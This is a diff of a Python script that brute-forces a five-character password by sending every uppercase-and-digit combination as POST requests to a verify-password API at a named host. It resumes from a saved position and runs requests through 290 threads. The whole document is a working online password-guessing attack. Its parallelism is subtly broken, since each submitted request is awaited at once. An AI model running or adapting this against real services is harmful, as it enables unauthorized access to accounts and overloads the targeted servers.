@@ -1,7 +1,7 @@
 import requests
 import string
-import os
 from itertools import product
+from concurrent.futures import ThreadPoolExecutor
 
 # API URL
 url = "https://secret.corgi.insure/api/verify-password"
@@ -9,56 +9,66 @@ url = "https://secret.corgi.insure/api/verify-password"
 # Characters to try: uppercase A-Z and digits 0-9
 characters = string.ascii_uppercase + string.digits
 
-# File to store the last tried password
+# File to save the last tried password
 last_password_file = "last_password.txt"
 
-def get_last_password():
-    """Load the last tried password from the file, if it exists."""
-    if os.path.exists(last_password_file):
-        with open(last_password_file, "r") as file:
-            return file.read().strip()
-    return None
+found_password_file = "found_password.txt"
 
+
+# Function to save the last tried password
 def save_last_password(password):
-    """Save the last tried password to the file."""
     with open(last_password_file, "w") as file:
         file.write(password)
 
-def brute_force_password():
-    # Get the last tried password, if any
-    last_password = get_last_password()
-    start_found = False if last_password else True
+def save_found_password(password):
+    with open(found_password_file, "w") as file:
+        file.write(password)
 
-    # Generate all combinations of 5 characters
-    for combo in product(characters, repeat=5):
-        password = ''.join(combo)
+# Function to load the last tried password
+def load_last_password():
+    try:
+        with open(last_password_file, "r") as file:
+            return file.read().strip()
+    except FileNotFoundError:
+        return "AACZT"  # Start point if no file exists
 
-        # Skip until we find the last tried password
-        if not start_found:
-            if password == last_password:
-                start_found = True
-            continue
+# Function to make a request
+def try_password(password):
+    payload = {"password": password}
+    response = requests.post(url, json=payload)
 
-        payload = {"password": password}
-        print(f"Trying password: {password}")
-
-        try:
-            # Make a POST request
-            response = requests.post(url, json=payload, timeout=5)
-            if response.status_code == 200 and response.json().get("success", False):
-                print(f"Password found: {password}")
-                return
-        except requests.RequestException as e:
-            print(f"Request failed: {e}")
-        
-        # Save the last tried password
+    if response.status_code == 200 and response.json().get("success", False):
+        print(f"Password found: {password}")
+        save_found_password(password)
+        return True
+    else:
         save_last_password(password)
+        return False
+
+# Main brute force function with parallelization
+def brute_force_password():
+    last_password = load_last_password()
+    found_start = False
+
+    # Using ThreadPoolExecutor for parallel requests
+    with ThreadPoolExecutor(max_workers=290) as executor:  # Adjust the number of workers as needed
+        # Generate all combinations of 5 characters
+        for combo in product(characters, repeat=5):
+            password = ''.join(combo)
+            
+            # Skip to the saved last password
+            if not found_start:
+                if password == last_password:
+                    found_start = True
+                continue
+
+            # Submit the password check to the executor
+            future = executor.submit(try_password, password)
+            if future.result():
+                print("Stopping further attempts.")
+                return
 
     print("Password not found.")
 
 # Run the script
-if __name__ == "__main__":
-    try:
-        brute_force_password()
-    except Keyboard:
-            print("\nProcess interrupted by user.")
+brute_force_password()
